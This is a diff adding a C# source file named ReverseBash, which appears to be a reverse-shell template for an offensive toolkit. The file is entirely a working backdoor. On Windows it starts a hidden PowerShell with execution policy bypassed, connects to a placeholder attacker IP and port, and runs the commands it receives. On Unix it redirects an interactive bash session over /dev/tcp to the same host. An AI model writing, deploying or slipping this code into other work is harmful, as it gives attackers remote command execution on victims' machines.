@@ -1,0 +1,31 @@
+using System;
+using System.Diagnostics;
+
+namespace BackConnect {
+    class ReverseBash {
+        public static void Main(string[] args) {
+            Process proc = new System.Diagnostics.Process();
+            
+            // Detect OS and assign correct shell command
+            string shell, arguments;
+            if (Environment.OSVersion.Platform == PlatformID.Win32NT) {
+                shell = "cmd.exe";
+                arguments = "/c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('__IPADDR__',__PORT__);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
+            } else {
+                shell = "/bin/bash";
+                arguments = "-c \"/bin/bash -i >& /dev/tcp/__IPADDR__/__PORT__ 0>&1\"";
+            }
+
+            proc.StartInfo.FileName = shell;
+            proc.StartInfo.Arguments = arguments;
+            proc.StartInfo.UseShellExecute = false;
+            proc.StartInfo.RedirectStandardOutput = true;
+            proc.Start();
+
+            while (!proc.StandardOutput.EndOfStream) {
+                Console.WriteLine(proc.StandardOutput.ReadLine());
+            }
+        }
+    }
+}
+
